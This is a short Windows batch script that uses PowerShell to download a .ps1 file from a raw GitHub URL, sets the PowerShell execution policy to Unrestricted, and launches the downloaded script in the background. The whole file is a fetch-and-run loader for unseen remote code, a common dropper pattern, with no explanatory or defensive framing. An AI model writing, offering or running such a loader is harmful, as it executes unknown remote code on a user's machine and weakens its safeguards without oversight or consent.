@echo off

set "powershellPath=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
set "scriptUrl=https://raw.githubusercontent.com/Royalboy2000/test2/main/test.ps1"
set "scriptPath=%~dp0test.ps1"
set "executionPolicy=Unrestricted"

REM Download the PowerShell script
echo Downloading PowerShell script...
powershell -Command "(New-Object Net.WebClient).DownloadFile('%scriptUrl%', '%scriptPath%')"

REM Set execution policy
echo Setting execution policy...
"%powershellPath%" -ExecutionPolicy %executionPolicy%

REM Run PowerShell script in the background
echo Running PowerShell script in the background...
start "" "%powershellPath%" -File "%scriptPath%"

echo Script execution completed.
exit

